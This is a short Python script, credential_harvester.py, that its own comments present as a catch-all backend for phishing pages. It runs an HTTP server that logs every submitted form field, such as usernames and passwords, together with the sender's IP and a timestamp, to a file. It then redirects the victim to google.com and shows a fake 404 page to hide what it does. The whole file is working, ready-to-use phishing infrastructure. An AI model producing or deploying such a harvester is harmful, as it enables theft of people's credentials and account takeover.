# language: Python 3, file: credential_harvester.py, target: Windows/Linux
# Generic HTTP POST catcher — logs any form data POSTed to it.
# Useful as a catch-all backend for any phishing page.
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, unquote_plus
import datetime

LOG_FILE = 'harvest.txt'

class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # suppress default access log

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'<h1>404 Not Found</h1>')

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode(errors='replace')
        params = parse_qs(body)
        ts = datetime.datetime.utcnow().isoformat()
        ip = self.client_address[0]
        line = f'[{ts}] FROM={ip}\n'
        for k, v in params.items():
            line += f'  {k} = {unquote_plus(v[0])}\n'
        line += '---\n'
        print(line)
        with open(LOG_FILE, 'a') as f:
            f.write(line)
        self.send_response(302)
        self.send_header('Location', 'https://google.com')
        self.end_headers()

def main():
    port = int(input('Listen port (ex: 8080): ').strip())
    print(f'[*] Harvester listening on 0.0.0.0:{port}')
    print(f'[*] Logs -> {LOG_FILE}')
    HTTPServer(('0.0.0.0', port), Handler).serve_forever()

if __name__ == '__main__':
    main()
